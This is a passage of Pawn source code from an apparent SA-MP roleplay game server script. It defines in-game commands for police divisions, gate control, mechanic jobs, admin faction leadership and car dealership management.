						format(string, sizeof(string), "You're now in the Field Training Operations division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s into the Field Training Operations division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else if(division == 5) {
						PlayerInfo[giveplayerid][pDivision] = 5;
						format(string, sizeof(string), "You're now in the Special Weapons and Tactics division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s into the Special Weapons and Tactics division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					}  else if(division == 6) {
						PlayerInfo[giveplayerid][pDivision] = 6;
						format(string, sizeof(string), "You're now in the Internal Affairs division, invited by %s.", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "You have invited %s into the Internal Affairs division.", GetPlayerNameEx(giveplayerid));
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
					} else cmd_lspddiv(playerid, "");
				} else SendClientMessage(playerid, COLOR_GRAD1, "That player is not in your faction!");
			} else SendClientMessage(playerid, COLOR_GRAD1, "Invalid player specified.");
		} else SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command - only R4+ can do this.");
	} else SendClientMessage(playerid, COLOR_GRAD1, "You are not a member of the LSPD.");
	return 1;
}

CMD:destroyplant(playerid, params[]) {
	if(IsACop(playerid) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pDivision] == 2) || (PlayerInfo[playerid][pFaction] == 3 && PlayerInfo[playerid][pRank] >= 5)) {
		foreach(Player, i) if(IsValidDynamicObject(PlayerInfo[i][pWeedObject]) && IsPlayerInRangeOfPoint(playerid, 4, PlayerInfo[i][pWeedPos][0], PlayerInfo[i][pWeedPos][1], PlayerInfo[i][pWeedPos][2])) {
			if(GetPlayerVirtualWorld(playerid) == PlayerInfo[i][pWeedVW] && GetPlayerInterior(playerid) == PlayerInfo[i][pWeedInt]) {
				new
					szMessage[128];

				ApplyAnimation(playerid,"BOMBER","BOM_Plant_Crouch_Out", 4.0, 0, 0, 0, 0, 0, 1);
				format(szMessage, sizeof(szMessage), "* You seized a marijuana plant weighing %d grams.", PlayerInfo[i][pWeedGrowth]);
				SendClientMessage(playerid, COLOR_GREY, szMessage);
				format(szMessage, sizeof(szMessage), "* %s seizes the weed plant.", GetPlayerNameEx(playerid), GetPlayerNameEx(i));
				ProxDetector(25.0, playerid, szMessage, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
				DestroyDynamicObject(PlayerInfo[i][pWeedObject]);
				PlayerInfo[i][pWeedObject] = 0;
				return 1;
			}
		}
		SendClientMessage(playerid, COLOR_GREY, "You're not at a plant.");
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "You're not a law enforcement officer.");
	}
	return 1;
}

CMD:makeleader(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	        return SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");

		new string[128], giveplayerid, faction;
		if(sscanf(params, "ud", giveplayerid, faction)) {
			SendClientMessage(playerid, COLOR_WHITE, "USAGE: /makeleader [playerid/partofname] [factionid]");
			SendClientMessage(playerid, COLOR_GRAD3, "|1 LSPD |2 FBI |3 LSFMD |4 Hitman |5 Government |9 SA News");
			return 1;
		}

		if(giveplayerid != INVALID_PLAYER_ID) {
		    new
				ftext[30];

			if(faction == 1)
				ftext = "LSPD";
			else if(faction == 2)
				ftext = "FBI";
			else if(faction == 3)
				ftext = "LSFMD";
			else if(faction == 4)
				ftext = "Hitman Agency";
			else if(faction == 5)
				ftext = "Government";
			else if(faction == 9)
				ftext = "SA News";
			else
				return SendClientMessage(playerid, COLOR_GREY, "Invalid faction ID.");

			PlayerInfo[giveplayerid][pLeader] = faction;
			PlayerInfo[giveplayerid][pRank] = 6;
			PlayerInfo[giveplayerid][pFaction] = faction;

			format(string, sizeof(string), "You have been made the leader of the %s by Admin %s.",ftext, GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "%s have made %s the leader of the %s.", GetPlayerNameEx(playerid), GetPlayerNameEx(playerid), ftext);
			Log("logs/faction.log", string);
			format(string, sizeof(string), "You have made %s the leader of the %s.", GetPlayerNameEx(giveplayerid),ftext);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			PlayerInfo[giveplayerid][pGang] = 255;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:gate(playerid, params[]) {
	new
		string[128];

    if(PlayerInfo[playerid][pLeader] == 1 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 1 || PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 5) {
        GetPlayerPos(playerid, Positions[0][0], Positions[0][1], Positions[0][2]);
        GetDynamicObjectPos(LSPDGate, Positions[1][0], Positions[1][1], Positions[1][2]);
        GetDynamicObjectPos(LSPDGate2, Positions[4][0], Positions[4][1], Positions[4][2]);
        GetDynamicObjectPos(FBIGate1, Positions[2][0], Positions[2][1], Positions[2][2]);
        GetDynamicObjectPos(FBIGate2, Positions[3][0], Positions[3][1], Positions[3][2]);

        if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[1][0], Positions[1][1], Positions[1][2]) < 15.0) {
            if(LSPDGateStatus == 0) {
                format(string, sizeof(string), "* %s uses their remote to open the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                SetDynamicObjectRot(LSPDGate, 0.000000, 0, 90);
                LSPDGateStatus = 1;
            }
            else {
                LSPDGateStatus = 0;
                SetDynamicObjectRot(LSPDGate, 0.000000, 90, 90);
                format(string, sizeof(string), "* %s uses their remote to close the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            }
        }
        else if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[4][0], Positions[4][1], Positions[4][2]) < 15.0) {
            if(LSPDGate2Status == 0) {
                format(string, sizeof(string), "* %s uses their remote to open the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 1588.6501464844, -1638.0750732422, 6.2343215942383, 3);
                LSPDGate2Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uses their remote to close the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 1588.6428222656, -1638.02734375, 15.240161895752, 3);
                LSPDGate2Status = 0;
            }
        }
        else if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[4][0], Positions[4][1], Positions[4][2]) < 15.0) {
            if(LSPDGate2Status == 0) {
                format(string, sizeof(string), "* %s uses their remote to open the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 313.49652099609, -1482.9189453125, 26.682577133179, 3);
                LSPDGate2Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uses their remote to close the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(LSPDGate2, 320.40628051758, -1487.9129638672, 26.900407791138, 3);
                LSPDGate2Status = 0;
            }
        }
	}

	if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2 || PlayerInfo[playerid][pFaction] == 5 || PlayerInfo[playerid][pFaction] == 5) {
        if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[2][0], Positions[2][1], Positions[2][2]) < 15.0) {
            if(FBIGate1Status == 0) {
                format(string, sizeof(string), "* %s uses their remote to open the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate1, 313.49652099609, -1482.9189453125, 26.682577133179, 3);
                FBIGate1Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uses their remote to close the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate1, 320.40628051758, -1487.9129638672, 26.900407791138, 3);
                FBIGate1Status = 0;
            }
        }
        else if(GetDistance(Positions[0][0], Positions[0][1], Positions[0][2], Positions[3][0], Positions[3][1], Positions[3][2]) < 15.0) {
            if(FBIGate2Status == 0) {
                format(string, sizeof(string), "* %s uses their remote to open the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate2, 290.56341552734, -1547.8900146484, 27.16854095459, 3);
                FBIGate2Status = 1;
            }
            else {
                format(string, sizeof(string), "* %s uses their remote to close the gates.", GetPlayerNameEx(playerid));
                ProxDetector(5.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
                MoveDynamicObject(FBIGate2, 283.96463012695, -1543.154296875, 27.167940139771, 3);
                FBIGate2Status = 0;
            }
		}
	}
    return 1;
}

CMD:fix(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
    	new string[32 + MAX_PLAYER_NAME];
        if(IsPlayerInAnyVehicle(playerid))
		{
		    SendClientMessage(playerid, COLOR_GRAD1, "You can't repair while inside the vehicle.");
		    return 1;
		}

  		if(PlayerInfo[playerid][pMechTime] > 0)
		{
  			format(string, sizeof(string), "You must wait %d seconds!", PlayerInfo[playerid][pMechTime]);
     		SendClientMessage(playerid, COLOR_GRAD1,string);
     	}
		else if(GetPVarInt(playerid, "EventToken"))
		{
			SendClientMessage(playerid, COLOR_GRAD1, "You can't use this while in an event.");
		}
  		else
		{
			new closestcar = GetClosestCar(playerid);

  			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 10.0))
  			{
				if(!IsABike(closestcar) && !IsAPlane(closestcar)) {
					new engine,lights,alarm,doors,bonnet,boot,objective;
					GetVehicleParamsEx(closestcar,engine,lights,alarm,doors,bonnet,boot,objective);
					if(bonnet == VEHICLE_PARAMS_OFF || bonnet == VEHICLE_PARAMS_UNSET)
					{
						SendClientMessage(playerid, COLOR_GRAD1, "The vehicle hood must be opened in order to repair it.");
						return 1;
					}
				}
  				PlayerInfo[playerid][pMechTime] = 60;
   				SetVehicleHealth(closestcar, 1000.0);
    			format(string, sizeof(string), "* %s has repaired the vehicle.", GetPlayerNameEx(playerid));
    			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			}
			else return SendClientMessage(playerid, COLOR_GRAD1, "You're not close enough to any vehicle.");
  		}
    }
    else return SendClientMessage(playerid, COLOR_WHITE, "You're not a Mechanic!");
    return 1;
}

CMD:nos(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7) {
        if(IsPlayerInAnyVehicle(playerid)) {
			if(GetPVarInt(playerid, "EventToken")) {
				return SendClientMessage(playerid, COLOR_GRAD1, "You can't use this while in an event.");
			}
            if(! IsPlayerInInvalidNosVehicle(playerid))
			{
   				if(GetPlayerCash(playerid) < 25)
		    	{
		        	SendClientMessage(playerid, COLOR_WHITE, "You do not have the money for that.");
		    	    return 1;
		    	}
                new string[128];
                new nostogive;
                new level = PlayerInfo[playerid][pMechSkill];
                if(level >= 0 && level < 50) { nostogive = 1009; }
                else if(level >= 50 && level < 100) { nostogive = 1009; }
                else if(level >= 100 && level < 200) { nostogive = 1008; }
                else if(level >= 200 && level < 400) { nostogive = 1008; }
                else if(level >= 400) { nostogive = 1010; }
                AddVehicleComponent(GetPlayerVehicleID(playerid),nostogive);
                                                  //NOS
                PlayerPlaySound(playerid,1133,0.0,0.0,0.0);

                GivePlayerCash(playerid, -25);
                format(string, sizeof(string), "* %s added nitrous injection to the vehicle.", GetPlayerNameEx(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            }
            else {
                SendClientMessage(playerid, COLOR_WHITE, "Nitrous injection can't be installed on this vehicle.");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_WHITE, "You're not in a vehicle.");
        }
    }
    else {
        SendClientMessage(playerid, COLOR_WHITE, "You're not a Mechanic!");
    }
    return 1;
}

CMD:hyd(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
        if(IsPlayerInAnyVehicle(playerid))
		{
		    if(GetPlayerCash(playerid) < 25)
		    {
		        SendClientMessage(playerid, COLOR_WHITE, "You do not have the money for that.");
		        return 1;
		    }
            if(! IsPlayerInInvalidNosVehicle(playerid)) {
                new string[128];
                PlayerPlaySound(playerid,1133,0.0,0.0,0.0);
                AddVehicleComponent(GetPlayerVehicleID(playerid), 1087);
                GivePlayerCash(playerid, -25);
                format(string, sizeof(string), "* %s added hydraulics to the vehicle.", GetPlayerNameEx(playerid));
                ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
            }
            else {
                SendClientMessage(playerid, COLOR_WHITE, "Hydraulics can't be installed in this vehicle.");
            }
        }
        else {
            SendClientMessage(playerid, COLOR_WHITE, "You're not in a vehicle.");
        }
    }
    else {
        SendClientMessage(playerid, COLOR_WHITE, "You're not a Mechanic!");
    }
    return 1;
}


CMD:repair(playerid, params[])
{
	if(PlayerInfo[playerid][pJob] != 7 && PlayerInfo[playerid][pJob2] != 7)
	{
		SendClientMessage(playerid, COLOR_GREY, "   You're not a Car Mechanic!");
		return 1;
	}
	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD1, "You can't repair while inside the vehicle.");

	new string[128];
	if(PlayerInfo[playerid][pMechTime] >= 1)
	{
		format(string, sizeof(string), "You must wait %d seconds!", PlayerInfo[playerid][pMechTime]);
		SendClientMessage(playerid, COLOR_GRAD1,string);
		return 1;
	}
	if(GetPVarInt(playerid, "EventToken")) {
		return SendClientMessage(playerid, COLOR_GRAD1, "You can't use this while in an event.");
	}
	new giveplayerid, money;
	if(sscanf(params, "ud", giveplayerid, money)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /repair [playerid/partofname] [price]");

	if(PlayerInfo[playerid][pTire] > 0)
	{
		if(money < 1 || money > 1000) { SendClientMessage(playerid, COLOR_GREY, "   Price not lower then $1 or above $1,000!"); return 1; }
		if(IsPlayerConnected(giveplayerid))
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
			    new closestcar = GetClosestCar(playerid);

	  			if(IsPlayerInRangeOfVehicle(playerid, closestcar, 8.0))
	  			{
					if(ProxDetectorS(8.0, playerid, giveplayerid)&& IsPlayerInAnyVehicle(giveplayerid))
					{
						if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "You can't offer a repair to yourself."); return 1; }
	                    if(!IsABike(closestcar) && !IsAPlane(closestcar))
						{
							new engine,lights,alarm,doors,bonnet,boot,objective;
							GetVehicleParamsEx(closestcar,engine,lights,alarm,doors,bonnet,boot,objective);
							if(bonnet == VEHICLE_PARAMS_OFF || bonnet == VEHICLE_PARAMS_UNSET)
							{
								SendClientMessage(playerid, COLOR_GRAD1, "The vehicle hood must be opened in order to repair it.");
								return 1;
							}
						}
						format(string, sizeof(string), "* You offered %s to fix their car for $%d .",GetPlayerNameEx(giveplayerid),money);
						SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						format(string, sizeof(string), "* Car Mechanic %s wants to repair your car for $%d, (type /accept repair) to accept.",GetPlayerNameEx(playerid),money);
						SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
						PlayerInfo[playerid][pMechTime] = 60;
						RepairOffer[giveplayerid] = playerid;
						RepairPrice[giveplayerid] = money;
					}
					else
					{
						SendClientMessage(playerid, COLOR_GREY, "   That player is not near you / not in a car.");
					}
				}
				else
				{
				    SendClientMessage(playerid, COLOR_GREY, "   You're not near any vehicle.");
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "   That player is offline.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "   You do not have any tires, buy one from a craftsman.");
	}
	return 1;
}

CMD:mechduty(playerid, params[])
{
    if(PlayerInfo[playerid][pJob] == 7 || PlayerInfo[playerid][pJob2] == 7)
	{
        if(JobDuty[playerid] == 1)
		{
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now off duty from your Car Mechanic job and will not receive calls anymore.");
            JobDuty[playerid] = 0;
            Mechanics -= 1;
        }
        else
		{
            if(TransportDuty[playerid] != 0) return SendClientMessage(playerid,COLOR_GREY,"You need to get off duty as a transport driver first.");
            SendClientMessage(playerid, COLOR_LIGHTBLUE, "* You're now on duty with your Car Mechanic job and will receive calls from people in need.");
            JobDuty[playerid] = 1;
            ++Mechanics;
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GRAD1, "   You're not a mechanic!");
    }
    return 1;
}

CMD:editcardealership(playerid, params[])
{
    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, CarDealershipInfo[d][cdRadius], CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ])) {
            if(IsPlayerOwnerOfCDEx(playerid, d))
			{
                SetPVarInt(playerid, "editingcd", d);
                SetPVarInt(playerid, "editingcdveh", -1);
                SetPVarInt(playerid, "editingcdvehpos", 0);
                SetPVarInt(playerid, "editingcdvehnew", 0);
                new listitems[] = "1 New Vehicle\n2 My Vehicles\n3 Upgrade\n4 Till";
                ShowPlayerDialogEx(playerid,DIALOG_CDEDIT,DIALOG_STYLE_LIST,"Choose an item to continue", listitems,"Select","Cancel");
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "You do not own that Car Dealership.");
                return 1;
            }
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "ERROR: You must be standing inside the radius of the Car Dealership.");
    return 1;
}

CMD:editcar(playerid, params[])
{
    new vehicleid = GetPlayerVehicleID(playerid);
    new v, d;
    v = GetCarDealershipVehicleId(vehicleid);
    d = GetCarDealershipId(vehicleid);
    if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GREY, "ERROR: you're not in any car.");
    if(v != -1 && d != -1)
	{
        if(IsPlayerOwnerOfCDEx(playerid, d))
		{
            SetPVarInt(playerid, "editingcd", d);
            SetPVarInt(playerid, "editingcdveh", v);
            SetPVarInt(playerid, "editingcdvehpos", 0);
            SetPVarInt(playerid, "editingcdvehnew", 0);
            new listitems[] = "1 Edit Model\n2 Edit Cost\n3 Edit Park\n4 Delete Vehicle";
            ShowPlayerDialogEx(playerid,DIALOG_CDEDITONE,DIALOG_STYLE_LIST,"Car Dealership:", listitems,"Select","Cancel");
            return 1;
        }
        else
		{
            SendClientMessage(playerid, COLOR_GREY, "ERROR: You do not own that Car Dealership.");
        }
    }
    else
	{
        SendClientMessage(playerid, COLOR_GREY, "ERROR: Car is not part of a Car Dealership.");
    }
    return 1;
}

CMD:buydealership(playerid, params[])
{
    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 3.0, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		{
            if(!CarDealershipInfo[d][cdOwned])
			{
                if(PlayerInfo[playerid][pCash] < CarDealershipInfo[d][cdPrice])
				{
                    SendClientMessage(playerid, COLOR_GREY, " You do not have enough money to buy this Car Dealership.");
                    return 1;
                }
                PlayerInfo[playerid][pCash] -= CarDealershipInfo[d][cdPrice];
                SetPlayerOwnerOfCD(playerid, d);
                PlayerPlayMusic(playerid);
                SendClientMessage(playerid, COLOR_WHITE, "Congratulations, On Your New Purchase.");
                SendClientMessage(playerid, COLOR_WHITE, "Type /help to review the new car dealership help section.");
                SendClientMessage(playerid, COLOR_GRAD1, " Please set the position you want your brought cars to spawn.");
                SendClientMessage(playerid, COLOR_GRAD2, " Stand where you want to have your brought vehicles spawn.");
                SendClientMessage(playerid, COLOR_GRAD2, " Once ready press the fire button.");
                SendClientMessage(playerid, COLOR_WHITE, " Note: If you don't set it your customers wont be able to buy any cars.");
                SetPVarInt(playerid, "editingcdvehpos", 2);
                SetPVarInt(playerid, "editingcd", d);
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "That Car Dealership is already owned and it's not for sale.");
            }
        }
    }
    return 1;
}

CMD:selldealership(playerid, params[])
{
	new string[128];

    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 3.0, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		{
            if(IsPlayerOwnerOfCDEx(playerid, d))
			{
                SetPVarInt(playerid, "editingcd", d);
                format(string,128,"Are you sure you want to sell this Car Dealership for $%d?\n.", CarDealershipInfo[d][cdPrice] / 2);
                ShowPlayerDialogEx(playerid,DIALOG_CDSELL,DIALOG_STYLE_MSGBOX,"Warning:",string,"Sell","Cancel");
                return 1;
            }
            else
			{
                SendClientMessage(playerid, COLOR_GREY, "You're not the owner of this car dealership.");
                return 1;
            }
        }
    }
    SendClientMessage(playerid, COLOR_GREY, "You have to be near a car dealership.");
    return 1;
}

CMD:createcdveh(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}


    new string[128], price, dealershipid, modelid;
    if(sscanf(params, "ddd", price, dealershipid, modelid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /createcdveh [price] [dealership] [modelid]");

    new Float:X,Float:Y,Float:Z,Float:A;
    GetPlayerPos(playerid,X,Y,Z);
    GetPlayerFacingAngle(playerid, A);
    new cdvehicleid = CreateCarDealershipVehicle(dealershipid, modelid, X, Y, Z, A, price);
    if(cdvehicleid == -1)
	{
        SendClientMessage(playerid, COLOR_GREY, "ERROR: cdVehicles limit reached.");
    }
    else
	{
        format(string, sizeof(string), " Car Dealership Vehicle created with ID %d.", cdvehicleid);
        SendClientMessage(playerid, COLOR_GRAD1, string);
    }
    return 1;
}

CMD:destroycdveh(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

    new string[128], vehid;
    if(sscanf(params, "d", vehid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /destroycdveh [vehicleid]");

    DestroyCarDealershipVehicle(GetCarDealershipId(vehid), GetCarDealershipVehicleId(vehid));
    SavecDealerships();
    format(string, sizeof(string), " Car Dealership Vehicle destroyed with ID %d.", vehid);
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

CMD:createdealership(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

    new string[128], price, radius, message[64];
    if(sscanf(params, "dds[64]", price, radius, message)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /createdealership [price] [radius] [message]");

    new Float:X,Float:Y,Float:Z;
    GetPlayerPos(playerid,X,Y,Z);
    new dealershipid = CreateCarDealership(X, Y, Z, radius, price, message);
    if(dealershipid == -1)
	{
        SendClientMessage(playerid, COLOR_GREY, "ERROR: Car Dealerships limit reached.");
    }
    else
	{
        format(string, sizeof(string), " Car Dealership created with ID %d.", dealershipid);
        SendClientMessage(playerid, COLOR_GRAD1, string);
    }
    return 1;
}

CMD:destroydealership(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 6)
	{
        SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");
        return 1;
    }
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   	}

    new string[128], dealershipid;
    if(sscanf(params, "d", dealershipid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /destroydealership [dealershipid]");

    for(new d = 0 ; d < MAX_CARDEALERSHIPS; d++)
	{
        if(IsPlayerInRangeOfPoint(playerid, 3.0, CarDealershipInfo[d][cdEntranceX], CarDealershipInfo[d][cdEntranceY], CarDealershipInfo[d][cdEntranceZ]))
		{
            DestroyCarDealership(d);
            format(string, sizeof(string), " Car Dealership destroyed with ID %d.", d);
            SendClientMessage(playerid, COLOR_GRAD1, string);
            return 1;
        }
    }
    if(dealershipid > MAX_CARDEALERSHIPS) return 1;
    if(dealershipid < 0) return 1;
    DestroyCarDealership(dealershipid);
    format(string, sizeof(string), " Car Dealership destroyed with ID %d.", dealershipid);
    SendClientMessage(playerid, COLOR_GRAD1, string);
    return 1;
}

CMD:createpvehicle(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] < 4)
	{
        SendClientMessage(playerid, COLOR_GREY, "You're not allowed to use this command.");
        return 1;
    }
    if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
    {
    	SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}
    new string[128], giveplayerid, modelid, color1, color2;
    if(sscanf(params, "uddd", giveplayerid, modelid, color1, color2)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /createpvehicle [playerid/partofname] [modelid] [color 1] [color 2]");

   	if(AdminDuty[giveplayerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You can't use that command on an on-duty admin.");
		return 1;
	}

    if(color1 < 0 || color1 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Color Number can't be below 0 or above 255!"); return 1; }
    if(color2 < 0 || color2 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Color Number can't be below 0 or above 255!"); return 1; }
    if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "   Vehicle Number can't be below 400 or above 611!"); return 1; }
    new playervehicleid = GetPlayerFreeVehicleId(giveplayerid),
		totalvehicles = GetPlayerVehicleCountEx(playerid);
	// (TEMPORARY - ZHAO NOTE) TempVIP not added yet
	if(PlayerInfo[giveplayerid][pVip] == 0 && totalvehicles >= 5) //PlayerInfo[giveplayerid][pTempVIP] > 0) && carsamount >= 5)
	{
        SendClientMessage(playerid, COLOR_GREY, "That player can't have more cars, non-VIP can only own 5 cars.");
        return 1;
	}
    if(PlayerInfo[giveplayerid][pVip] == 1 && totalvehicles >= 7)
    {
        SendClientMessage(playerid, COLOR_GREY, "That player can't have more cars, Bronze VIP can only own 7 cars.");
        return 1;
    }
    if(PlayerInfo[giveplayerid][pVip] == 2 && totalvehicles >= 8)
    {
        SendClientMessage(playerid, COLOR_GREY, "That player can't have more cars, Silver VIP can only own 8 cars.");
        return 1;
    }
    if(PlayerInfo[giveplayerid][pVip] == 3 && totalvehicles >= 10)
    {
        SendClientMessage(playerid, COLOR_GREY, "That player can't have more cars, Gold VIP can only own 10 cars.");
        return 1;
    }

    if(playervehicleid == -1) return SendClientMessage(playerid, COLOR_GREY, "ERROR: That player can't have more cars.");
    if(PlayerInfo[giveplayerid][pVip] == 0 && VehicleSpawned[giveplayerid] > 0)
    {
